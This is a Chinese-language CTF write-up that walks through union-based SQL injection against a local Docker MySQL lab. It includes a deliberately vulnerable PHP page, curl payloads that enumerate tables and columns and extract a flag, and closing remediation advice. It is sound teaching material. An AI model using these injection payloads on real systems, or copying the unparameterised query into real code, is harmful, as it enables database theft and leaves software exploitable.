---
title: "SQL 注入题目示例"
slug: "ctf-sqli-example"
date: 2026-08-30T21:25:13+08:00
lastmod: 2026-10-27T11:30:00+08:00
draft: false
author: ["xuanwo"]
description: "从登录框到联合查询，记录一道 SQL 注入题的分析与利用过程。"
summary: "从登录框到联合查询，记录一道 SQL 注入题的分析与利用过程。"
tags: ["CTF", "SQL注入", "Web"]
categories: ["CTF Writeup"]
series: ["CTF Writeup"]
weight: 6
ShowToc: true
TocOpen: false
hidemeta: false
comments: false
showReadingTime: true
ShowBreadCrumbs: true
ShowPostNavLinks: true
ShowCodeCopyButtons: true
source_repo: "https://github.com/xuanwoLQL/security-notes/blob/main/ctf-writeups/6.SQL注入题目示例.md"
---

## 复现流程图

<figure class="note-diagram">
  <img src="/images/notes/ctf-sqli-example/workflow.svg" alt="先确定列数，再依次枚举库表、字段和值。" loading="lazy">
  <figcaption>图 1 · 联合查询 SQL 注入流程。先确定列数，再依次枚举库表、字段和值。</figcaption>
</figure>

## 1. 环境与目标

先准备一个本地 MySQL 环境，避免在真实业务上测试：

```bash
docker run --rm -d --name sqli-lab \
  -e MYSQL_ROOT_PASSWORD=root \
  -p 3306:3306 mysql:8.4
```

等待数据库初始化，然后写入测试库：

```bash
cat > /tmp/init.sql <<'SQL'
CREATE DATABASE ctf CHARACTER SET utf8mb4;
USE ctf;
CREATE TABLE users (
  id INT PRIMARY KEY AUTO_INCREMENT,
  username VARCHAR(64),
  password VARCHAR(64)
);
INSERT INTO users(username, password) VALUES ('admin', 'not-the-password');
CREATE TABLE flag (
  id INT PRIMARY KEY,
  value VARCHAR(128)
);
INSERT INTO flag VALUES (1, 'flag{local_sqli_demo}');
SQL

docker exec -i sqli-lab mysql -uroot -proot < /tmp/init.sql
```

## 2. 最小漏洞页面

创建 `/tmp/sqli/index.php`：

```php
<?php
$conn = new mysqli("127.0.0.1", "root", "root", "ctf");
if ($conn->connect_error) {
    die($conn->connect_error);
}

$id = $_GET['id'] ?? '1';
$sql = "SELECT username, password FROM users WHERE id = $id";
$result = $conn->query($sql);

if ($result) {
    while ($row = $result->fetch_assoc()) {
        echo htmlspecialchars($row['username']) . ":" .
             htmlspecialchars($row['password']) . "\n";
    }
} else {
    echo $conn->error;
}
```

启动：

```bash
cd /tmp/sqli
php -S 127.0.0.1:8080
```

正常请求：

```bash
curl -sS 'http://127.0.0.1:8080/?id=1'
```

## 3. 判断列数

先用 `ORDER BY` 或 `UNION SELECT NULL` 确定列数：

```bash
curl -sS --get --data-urlencode "id=0 ORDER BY 1-- -" 'http://127.0.0.1:8080/'
curl -sS --get --data-urlencode "id=0 ORDER BY 2-- -" 'http://127.0.0.1:8080/'
curl -sS --get --data-urlencode "id=0 ORDER BY 3-- -" 'http://127.0.0.1:8080/'
```

第 3 个报错，说明查询是 2 列。再验证：

```bash
curl -sS --get --data-urlencode "id=0 UNION SELECT NULL,NULL-- -" \
  'http://127.0.0.1:8080/'
```

## 4. 枚举库表

```bash
curl -sS --get --data-urlencode \
  "id=0 UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema=database()-- -" \
  'http://127.0.0.1:8080/'
```

预期能看到 `users`、`flag`。

## 5. 枚举字段

```bash
curl -sS --get --data-urlencode \
  "id=0 UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_schema=database() AND table_name='flag'-- -" \
  'http://127.0.0.1:8080/'
```

预期字段为 `id`、`value`。

## 6. 读取 flag

```bash
curl -sS --get --data-urlencode \
  "id=0 UNION SELECT value,NULL FROM flag-- -" \
  'http://127.0.0.1:8080/'
```

预期：

```text
flag{local_sqli_demo}
```

## 7. 复现原题时

把本地 `id` 换回原题参数名：

```text
1' UNION SELECT NULL,NULL #
1' UNION SELECT table_name,NULL FROM information_schema.tables
    WHERE table_schema=database() #
1' UNION SELECT column_name,NULL FROM information_schema.columns
    WHERE table_name='flag' #
1' UNION SELECT value,NULL FROM flag #
```

不同数据库注释符不同：

- MySQL：`#` 或 `-- `；
- PostgreSQL：`--`；
- MSSQL：`--`；
- SQLite：`--`。

## 8. 排错

| 现象 | 原因 | 修复 |
| --- | --- | --- |
| `UNION` 列数不一致 | `SELECT` 列数不同 | 先用 `NULL` 对齐 |
| 页面没有回显 | 盲注/无回显 | 改布尔或时间盲注 |
| `information_schema` 被禁 | 权限或数据库类型不同 | 查对应系统表 |
| 本地 PHP 无法连 MySQL | 容器未就绪/端口不同 | `docker logs sqli-lab` |

## 9. 修复建议

- 使用预处理语句；
- 参数类型强制转换；
- 数据库账号最小权限；
- 关闭详细错误回显；
- 对登录接口加速率限制与审计。
